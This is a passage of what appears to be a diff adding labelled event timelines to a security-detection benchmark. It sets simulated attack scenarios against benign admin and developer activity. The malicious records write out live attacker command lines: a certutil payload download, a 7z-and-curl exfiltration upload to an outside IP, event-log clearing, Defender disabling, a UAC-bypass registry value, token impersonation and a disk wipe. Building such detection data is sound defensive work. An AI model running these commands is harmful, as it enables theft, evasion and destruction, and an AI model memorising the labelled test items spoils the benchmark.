+          "DestinationPort": 445,
+          "Action": "TCP_SYN",
+          "is_malicious": true,
+          "severity": "MEDIUM",
+          "host": "HOST-WS-11",
+          "user": "guest_user"
+        },
+        "extracted_indicators": [
+          "10.0.1.1"
+        ],
+        "ground_truth_label": "malicious"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "NetworkConnect",
+        "timestamp": "2026-11-06T05:06:00+00:00",
+        "original_record": {
+          "DestinationIp": "10.0.1.1",
+          "DestinationPort": 3389,
+          "Action": "TCP_SYN",
+          "is_malicious": true,
+          "severity": "MEDIUM",
+          "host": "HOST-WS-11",
+          "user": "guest_user"
+        },
+        "extracted_indicators": [
+          "10.0.1.1"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "5e383ffa-ed01-423c-89bc-47cc8439c562",
+    "grouping_key": "HOST-WS-14:contractor",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M23-Discovery-SessionRecon",
+    "total_events": 3,
+    "start_time": "2026-11-06T06:00:00+00:00",
+    "end_time": "2026-11-06T06:06:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-06T06:00:00+00:00",
+        "original_record": {
+          "ProcessName": "net.exe",
+          "CommandLine": "net.exe session",
+          "User": "contractor",
+          "is_malicious": true,
+          "severity": "LOW",
+          "host": "HOST-WS-14",
+          "user": "contractor"
+        },
+        "extracted_indicators": [
+          "net.exe"
+        ],
+        "ground_truth_label": "malicious"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-06T06:03:00+00:00",
+        "original_record": {
+          "ProcessName": "qwinsta.exe",
+          "CommandLine": "qwinsta.exe",
+          "User": "contractor",
+          "is_malicious": true,
+          "severity": "LOW",
+          "host": "HOST-WS-14",
+          "user": "contractor"
+        },
+        "extracted_indicators": [
+          "qwinsta.exe"
+        ],
+        "ground_truth_label": "malicious"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-06T06:06:00+00:00",
+        "original_record": {
+          "ProcessName": "whoami.exe",
+          "CommandLine": "whoami.exe /priv",
+          "User": "contractor",
+          "is_malicious": true,
+          "severity": "LOW",
+          "host": "HOST-WS-14",
+          "user": "contractor"
+        },
+        "extracted_indicators": [
+          "whoami.exe"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "df73d344-1399-4fc6-b6a2-b133d160017e",
+    "grouping_key": "HOST-WS-16:standard_user",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M24-PrivEsc-UAC-Bypass",
+    "total_events": 2,
+    "start_time": "2026-11-06T07:00:00+00:00",
+    "end_time": "2026-11-06T07:03:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-06T07:00:00+00:00",
+        "original_record": {
+          "ProcessName": "fodhelper.exe",
+          "CommandLine": "fodhelper.exe",
+          "User": "standard_user",
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-WS-16",
+          "user": "standard_user"
+        },
+        "extracted_indicators": [
+          "fodhelper.exe"
+        ],
+        "ground_truth_label": "malicious"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "RegistrySet",
+        "timestamp": "2026-11-06T07:03:00+00:00",
+        "original_record": {
+          "Path": "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command",
+          "Value": "cmd.exe /c start cmd.exe",
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-WS-16",
+          "user": "standard_user"
+        },
+        "extracted_indicators": [
+          "ms-settings"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "1d8460c2-a33f-4cc9-bb89-da38b4c91a4b",
+    "grouping_key": "HOST-WS-17:svc_account",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M25-PrivEsc-TokenImpersonation",
+    "total_events": 1,
+    "start_time": "2026-11-06T08:00:00+00:00",
+    "end_time": "2026-11-06T08:00:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-06T08:00:00+00:00",
+        "original_record": {
+          "ProcessName": "incognito.exe",
+          "CommandLine": "incognito.exe execute -t \"NT AUTHORITY\\SYSTEM\" cmd.exe",
+          "User": "svc_account",
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-WS-17",
+          "user": "svc_account"
+        },
+        "extracted_indicators": [
+          "incognito.exe"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "19dcc8c9-b611-4e80-91db-fe87132d1c1f",
+    "grouping_key": "HOST-PRINT-01:spool_user",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M26-PrivEsc-NamedPipe",
+    "total_events": 1,
+    "start_time": "2026-11-06T09:00:00+00:00",
+    "end_time": "2026-11-06T09:00:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "NamedPipeConnect",
+        "timestamp": "2026-11-06T09:00:00+00:00",
+        "original_record": {
+          "PipeName": "\\\\.\\pipe\\spoolss",
+          "ImpersonationLevel": "SecurityDelegation",
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-PRINT-01",
+          "user": "spool_user"
+        },
+        "extracted_indicators": [
+          "spoolss"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "79cfce3f-d8dc-4940-9943-46fc0c0cddbd",
+    "grouping_key": "HOST-WS-18:auditor",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M27-DefenseEvasion-EventLogClear",
+    "total_events": 2,
+    "start_time": "2026-11-06T10:00:00+00:00",
+    "end_time": "2026-11-06T10:03:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-06T10:00:00+00:00",
+        "original_record": {
+          "ProcessName": "wevtutil.exe",
+          "CommandLine": "wevtutil.exe cl Security",
+          "User": "SYSTEM",
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-WS-18",
+          "user": "auditor"
+        },
+        "extracted_indicators": [
+          "wevtutil.exe"
+        ],
+        "ground_truth_label": "malicious"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-06T10:03:00+00:00",
+        "original_record": {
+          "ProcessName": "wevtutil.exe",
+          "CommandLine": "wevtutil.exe cl System",
+          "User": "SYSTEM",
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-WS-18",
+          "user": "auditor"
+        },
+        "extracted_indicators": [
+          "wevtutil.exe"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "f70ecc2f-3806-4f22-a69d-bcda1a47820d",
+    "grouping_key": "HOST-WS-19:ops_user",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M28-DefenseEvasion-DisableDefender",
+    "total_events": 1,
+    "start_time": "2026-11-06T11:00:00+00:00",
+    "end_time": "2026-11-06T11:00:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-06T11:00:00+00:00",
+        "original_record": {
+          "ProcessName": "powershell.exe",
+          "CommandLine": "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true",
+          "User": "Administrator",
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-WS-19",
+          "user": "ops_user"
+        },
+        "extracted_indicators": [
+          "Set-MpPreference"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "966c9f2e-4e1d-4178-95b6-d39aadffed40",
+    "grouping_key": "HOST-WS-20:user_x",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M29-DefenseEvasion-ProcessHollowing",
+    "total_events": 2,
+    "start_time": "2026-11-06T12:00:00+00:00",
+    "end_time": "2026-11-06T12:03:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-06T12:00:00+00:00",
+        "original_record": {
+          "ProcessName": "svchost.exe",
+          "CommandLine": "svchost.exe -k netsvcs",
+          "Flags": "CREATE_SUSPENDED",
+          "is_malicious": true,
+          "severity": "CRITICAL",
+          "host": "HOST-WS-20",
+          "user": "user_x"
+        },
+        "extracted_indicators": [
+          "svchost.exe"
+        ],
+        "ground_truth_label": "malicious"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "MemoryInject",
+        "timestamp": "2026-11-06T12:03:00+00:00",
+        "original_record": {
+          "TargetProcess": "svchost.exe",
+          "Action": "NtUnmapViewOfSection",
+          "User": "SYSTEM",
+          "is_malicious": true,
+          "severity": "CRITICAL",
+          "host": "HOST-WS-20",
+          "user": "user_x"
+        },
+        "extracted_indicators": [
+          "svchost.exe"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "69d63ef5-246b-4a29-b8b8-e1099a52122e",
+    "grouping_key": "HOST-WS-21:clerk",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M30-DefenseEvasion-CertutilDownload",
+    "total_events": 1,
+    "start_time": "2026-11-06T13:00:00+00:00",
+    "end_time": "2026-11-06T13:00:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-06T13:00:00+00:00",
+        "original_record": {
+          "ProcessName": "certutil.exe",
+          "CommandLine": "certutil.exe -urlcache -split -f \"http://185.190.20.1/mal.exe\" mal.exe",
+          "User": "clerk",
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-WS-21",
+          "user": "clerk"
+        },
+        "extracted_indicators": [
+          "185.190.20.1",
+          "certutil.exe"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "81352033-58aa-46fe-b8b3-347074be9f32",
+    "grouping_key": "HOST-RND-01:researcher",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M31-Exfiltration-ArchiveAndCurl",
+    "total_events": 2,
+    "start_time": "2026-11-06T14:00:00+00:00",
+    "end_time": "2026-11-06T14:03:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-06T14:00:00+00:00",
+        "original_record": {
+          "ProcessName": "7z.exe",
+          "CommandLine": "7z.exe a -pSecret123! C:\\Temp\\exfil.zip C:\\SecretData\\*",
+          "User": "researcher",
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-RND-01",
+          "user": "researcher"
+        },
+        "extracted_indicators": [
+          "7z.exe",
+          "exfil.zip"
+        ],
+        "ground_truth_label": "malicious"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-06T14:03:00+00:00",
+        "original_record": {
+          "ProcessName": "curl.exe",
+          "CommandLine": "curl.exe -F \"data=@C:\\Temp\\exfil.zip\" http://91.240.118.5/upload",
+          "User": "researcher",
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-RND-01",
+          "user": "researcher"
+        },
+        "extracted_indicators": [
+          "91.240.118.5",
+          "curl.exe"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "b6343fa3-7a07-442f-9456-e7b1dd7652cc",
+    "grouping_key": "HOST-RND-02:researcher",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M32-Exfiltration-DNSStash",
+    "total_events": 2,
+    "start_time": "2026-11-06T15:00:00+00:00",
+    "end_time": "2026-11-06T15:03:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "NetworkDNS",
+        "timestamp": "2026-11-06T15:00:00+00:00",
+        "original_record": {
+          "Query": "chunk1.exfil.dnsleak.net",
+          "RecordType": "TXT",
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-RND-02",
+          "user": "researcher"
+        },
+        "extracted_indicators": [
+          "dnsleak.net"
+        ],
+        "ground_truth_label": "malicious"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "NetworkDNS",
+        "timestamp": "2026-11-06T15:03:00+00:00",
+        "original_record": {
+          "Query": "chunk2.exfil.dnsleak.net",
+          "RecordType": "TXT",
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-RND-02",
+          "user": "researcher"
+        },
+        "extracted_indicators": [
+          "dnsleak.net"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "549237e1-3f66-477e-9458-a2dedb15150e",
+    "grouping_key": "HOST-WS-22:receptionist",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M33-InitialAccess-PhishingMacro",
+    "total_events": 2,
+    "start_time": "2026-11-06T16:00:00+00:00",
+    "end_time": "2026-11-06T16:03:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-06T16:00:00+00:00",
+        "original_record": {
+          "ProcessName": "WINWORD.EXE",
+          "CommandLine": "WINWORD.EXE C:\\Users\\receptionist\\Downloads\\Invoice.docm",
+          "User": "receptionist",
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-WS-22",
+          "user": "receptionist"
+        },
+        "extracted_indicators": [
+          "WINWORD.EXE"
+        ],
+        "ground_truth_label": "malicious"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-06T16:03:00+00:00",
+        "original_record": {
+          "ProcessName": "powershell.exe",
+          "CommandLine": "powershell.exe -w hidden -enc aW52b2tlLWJveA==",
+          "ParentProcessName": "WINWORD.EXE",
+          "is_malicious": true,
+          "severity": "HIGH",
+          "host": "HOST-WS-22",
+          "user": "receptionist"
+        },
+        "extracted_indicators": [
+          "powershell.exe"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "e37fec0b-be69-4cb9-87b1-d488fe328345",
+    "grouping_key": "HOST-WEB-02:iis_pool",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M34-InitialAccess-WebShell",
+    "total_events": 2,
+    "start_time": "2026-11-06T17:00:00+00:00",
+    "end_time": "2026-11-06T17:03:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-06T17:00:00+00:00",
+        "original_record": {
+          "ProcessName": "w3wp.exe",
+          "CommandLine": "w3wp.exe -ap \"DefaultAppPool\"",
+          "User": "iis_user",
+          "is_malicious": true,
+          "severity": "CRITICAL",
+          "host": "HOST-WEB-02",
+          "user": "iis_pool"
+        },
+        "extracted_indicators": [
+          "w3wp.exe"
+        ],
+        "ground_truth_label": "malicious"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-06T17:03:00+00:00",
+        "original_record": {
+          "ProcessName": "cmd.exe",
+          "CommandLine": "cmd.exe /c whoami && ipconfig /all",
+          "ParentProcessName": "w3wp.exe",
+          "is_malicious": true,
+          "severity": "CRITICAL",
+          "host": "HOST-WEB-02",
+          "user": "iis_pool"
+        },
+        "extracted_indicators": [
+          "cmd.exe"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "233ee8c5-1001-4c41-91a6-dd5722501ef0",
+    "grouping_key": "HOST-WS-23:terminated_emp",
+    "correlation_type": "confirmed",
+    "correlation_reason": "attack_scenario_M35-Impact-DiskWipe",
+    "total_events": 1,
+    "start_time": "2026-11-06T18:00:00+00:00",
+    "end_time": "2026-11-06T18:00:00+00:00",
+    "ground_truth_label": "malicious",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-MALICIOUS",
+        "source_file": "attack_simulation.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-06T18:00:00+00:00",
+        "original_record": {
+          "ProcessName": "sdelete.exe",
+          "CommandLine": "sdelete.exe -p 3 -z C:\\",
+          "User": "terminated_emp",
+          "is_malicious": true,
+          "severity": "CRITICAL",
+          "host": "HOST-WS-23",
+          "user": "terminated_emp"
+        },
+        "extracted_indicators": [
+          "sdelete.exe"
+        ],
+        "ground_truth_label": "malicious"
+      }
+    ]
+  },
+  {
+    "timeline_id": "215f36c9-aba9-4a58-822e-d60125207499",
+    "grouping_key": "HOST-DEV-01:dev_alice",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B01-Developer-GitWorkflow",
+    "total_events": 2,
+    "start_time": "2026-11-07T00:00:00+00:00",
+    "end_time": "2026-11-07T00:02:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-07T00:00:00+00:00",
+        "original_record": {
+          "ProcessName": "git.exe",
+          "CommandLine": "git.exe pull origin main",
+          "User": "dev_alice",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-DEV-01",
+          "user": "dev_alice"
+        },
+        "extracted_indicators": [
+          "git.exe"
+        ],
+        "ground_truth_label": "benign"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-07T00:02:00+00:00",
+        "original_record": {
+          "ProcessName": "git.exe",
+          "CommandLine": "git.exe commit -m \"Refactor auth tests\"",
+          "User": "dev_alice",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-DEV-01",
+          "user": "dev_alice"
+        },
+        "extracted_indicators": [
+          "git.exe"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "b78f2606-43cd-476c-b1a9-41dbb65573ef",
+    "grouping_key": "HOST-DEV-03:dev_bob",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B02-Developer-DockerBuild",
+    "total_events": 2,
+    "start_time": "2026-11-07T01:00:00+00:00",
+    "end_time": "2026-11-07T01:02:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-07T01:00:00+00:00",
+        "original_record": {
+          "ProcessName": "docker.exe",
+          "CommandLine": "docker.exe build -t microservice:v2 .",
+          "User": "dev_bob",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-DEV-03",
+          "user": "dev_bob"
+        },
+        "extracted_indicators": [
+          "docker.exe"
+        ],
+        "ground_truth_label": "benign"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-07T01:02:00+00:00",
+        "original_record": {
+          "ProcessName": "docker.exe",
+          "CommandLine": "docker.exe run -d -p 8080:8080 microservice:v2",
+          "User": "dev_bob",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-DEV-03",
+          "user": "dev_bob"
+        },
+        "extracted_indicators": [
+          "docker.exe"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "5332e581-435c-45ca-b9ba-78e57dba9ec7",
+    "grouping_key": "HOST-DEV-04:dev_charlie",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B03-Developer-VSCodeUpdate",
+    "total_events": 2,
+    "start_time": "2026-11-07T02:00:00+00:00",
+    "end_time": "2026-11-07T02:02:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-07T02:00:00+00:00",
+        "original_record": {
+          "ProcessName": "Code.exe",
+          "CommandLine": "Code.exe --update",
+          "User": "dev_charlie",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-DEV-04",
+          "user": "dev_charlie"
+        },
+        "extracted_indicators": [
+          "Code.exe"
+        ],
+        "ground_truth_label": "benign"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "FileAccess",
+        "timestamp": "2026-11-07T02:02:00+00:00",
+        "original_record": {
+          "Path": "C:\\Users\\dev_charlie\\.vscode\\extensions.json",
+          "Action": "read",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-DEV-04",
+          "user": "dev_charlie"
+        },
+        "extracted_indicators": [
+          "extensions.json"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "2ea8f92e-5802-4522-a455-1dc912079dc6",
+    "grouping_key": "HOST-DEV-05:dev_diana",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B04-Developer-NpmInstall",
+    "total_events": 1,
+    "start_time": "2026-11-07T03:00:00+00:00",
+    "end_time": "2026-11-07T03:00:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-07T03:00:00+00:00",
+        "original_record": {
+          "ProcessName": "npm.exe",
+          "CommandLine": "npm.exe install express body-parser",
+          "User": "dev_diana",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-DEV-05",
+          "user": "dev_diana"
+        },
+        "extracted_indicators": [
+          "npm.exe"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "df7b8e6a-a47e-4d00-880b-7087f53867fd",
+    "grouping_key": "HOST-WS-30:admin_ops",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B05-ITAdmin-WindowsUpdate",
+    "total_events": 2,
+    "start_time": "2026-11-07T04:00:00+00:00",
+    "end_time": "2026-11-07T04:02:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-07T04:00:00+00:00",
+        "original_record": {
+          "ProcessName": "wuauclt.exe",
+          "CommandLine": "wuauclt.exe /detectnow",
+          "User": "SYSTEM",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-WS-30",
+          "user": "admin_ops"
+        },
+        "extracted_indicators": [
+          "wuauclt.exe"
+        ],
+        "ground_truth_label": "benign"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-07T04:02:00+00:00",
+        "original_record": {
+          "ProcessName": "TrustedInstaller.exe",
+          "CommandLine": "TrustedInstaller.exe install KB5034441",
+          "User": "SYSTEM",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-WS-30",
+          "user": "admin_ops"
+        },
+        "extracted_indicators": [
+          "TrustedInstaller.exe"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "e987448a-d532-4a2f-bfc4-6524a2da6cde",
+    "grouping_key": "HOST-WS-31:admin_ops",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B06-ITAdmin-SoftwareDeployment",
+    "total_events": 1,
+    "start_time": "2026-11-07T05:00:00+00:00",
+    "end_time": "2026-11-07T05:00:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-07T05:00:00+00:00",
+        "original_record": {
+          "ProcessName": "msiexec.exe",
+          "CommandLine": "msiexec.exe /i \"C:\\Deploy\\Slack.msi\" /qn /norestart",
+          "User": "SYSTEM",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-WS-31",
+          "user": "admin_ops"
+        },
+        "extracted_indicators": [
+          "msiexec.exe"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "7a2fde4c-bda2-4f72-b99b-2e8f798a11df",
+    "grouping_key": "HOST-WS-32:admin_ops",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B07-ITAdmin-DiskCleanup",
+    "total_events": 1,
+    "start_time": "2026-11-07T06:00:00+00:00",
+    "end_time": "2026-11-07T06:00:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-07T06:00:00+00:00",
+        "original_record": {
+          "ProcessName": "cleanmgr.exe",
+          "CommandLine": "cleanmgr.exe /sagerun:1",
+          "User": "SYSTEM",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-WS-32",
+          "user": "admin_ops"
+        },
+        "extracted_indicators": [
+          "cleanmgr.exe"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "cb0210aa-055e-45e3-8398-800716da44f2",
+    "grouping_key": "HOST-WS-33:it_support",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B08-ITAdmin-ServiceRestart",
+    "total_events": 2,
+    "start_time": "2026-11-07T07:00:00+00:00",
+    "end_time": "2026-11-07T07:02:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-07T07:00:00+00:00",
+        "original_record": {
+          "ProcessName": "net.exe",
+          "CommandLine": "net.exe stop Spooler",
+          "User": "it_support",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-WS-33",
+          "user": "it_support"
+        },
+        "extracted_indicators": [
+          "net.exe"
+        ],
+        "ground_truth_label": "benign"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-07T07:02:00+00:00",
+        "original_record": {
+          "ProcessName": "net.exe",
+          "CommandLine": "net.exe start Spooler",
+          "User": "it_support",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-WS-33",
+          "user": "it_support"
+        },
+        "extracted_indicators": [
+          "net.exe"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "0b1578ae-b231-429d-8bb4-14cc02c75d09",
+    "grouping_key": "HOST-WS-34:it_support",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B09-ITAdmin-NetworkDiagnostics",
+    "total_events": 2,
+    "start_time": "2026-11-07T08:00:00+00:00",
+    "end_time": "2026-11-07T08:02:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
